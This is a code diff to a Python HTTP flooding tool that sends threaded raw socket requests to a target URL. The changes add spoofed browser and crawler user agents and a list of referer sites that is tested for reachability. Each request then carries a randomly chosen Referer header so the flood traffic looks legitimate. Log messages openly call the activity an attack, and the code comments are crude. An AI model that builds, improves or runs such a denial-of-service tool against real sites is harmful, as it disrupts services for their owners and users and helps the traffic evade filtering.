@@ -11,6 +11,7 @@ import threading
 import time
 import sys
 import os #Needed for DNS resolving, don't get caught fucking with the ports, nerd
+import requests # Needed for checking referers
 
 # Color scheme (Dark Green, Purple, Dark Red, Dark Blue)
 GREEN = '\033[32m'
@@ -54,7 +55,53 @@ user_agents = [
  "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)", # DuckDuckGo bot. Gotta be fair.
  "Baiduspider+(+http://www.baidu.com/search/spider.htm)", #Baidu Spider.
  "YandexBot/3.0 (+http://yandex.com/bots)", # Yandex Bot, fuck russia
+ "Opera/9.80 (Windows NT 6.2; WOW64) Presto/2.12.388 Version/12.18", # Adding Opera
+ "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.91 Safari/537.36" # Headless Chrome
 ]
+
+# Referer list
+referers = [
+ "https://www.google.com/",
+ "https://www.facebook.com/",
+ "https://www.twitter.com/",
+ "https://www.youtube.com/",
+ "https://www.linkedin.com/",
+ "https://www.instagram.com/",
+ "https://www.baidu.com/",
+ "https://www.wikipedia.org/",
+ "https://yandex.ru/",
+ "https://duckduckgo.com/",
+ "https://www.bing.com/",
+ "https://www.yahoo.com/",
+ "https://www.amazon.com/",
+ "https://www.reddit.com/",
+ "https://www.tumblr.com/",
+ "https://www.pinterest.com/",
+ "https://www.twitch.tv/",
+ "https://www.stackoverflow.com/",
+ "https://www.netflix.com/",
+ "https://www.openai.com/",
+ "https://pornhub.com/",
+ "https://xvideos.com/",
+ "https://chaturbate.com/"
+]
+
+# Function to check referer validity
+def is_valid_referer(referer):
+ try:
+ response = requests.get(referer, timeout=5)
+ return response.status_code < 400
+ except requests.RequestException:
+ return False
+
+# Remove invalid referers
+valid_referers = [r for r in referers if is_valid_referer(r)]
+if not valid_referers:
+ print(f"{RED}No valid referers found. Attack may be less effective.{RESET}")
+ log("No valid referers found. Attack may be less effective.")
+else:
+ print(f"{GREEN}Found {len(valid_referers)} valid referers.{RESET}")
+ log(f"Found {len(valid_referers)} valid referers.")
 
 # Target URL and number of threads
 url = ""
@@ -93,7 +140,8 @@ def http_request(url, user_agent):
  request_header += f"Host: {hostname}\r\n" # Use the hostname
  request_header += f"User-Agent: {user_agent}\r\n"
  request_header += "Cache-Control: no-cache\r\n"
- request_header += "Connection: Keep-Alive\r\n\r\n"
+ request_header += "Connection: Keep-Alive\r\n"
+ request_header += f"Referer: {random.choice(valid_referers)}\r\n\r\n" # Adding Referer
 
  # Send the request
  sock.send(request_header.encode('utf-8'))
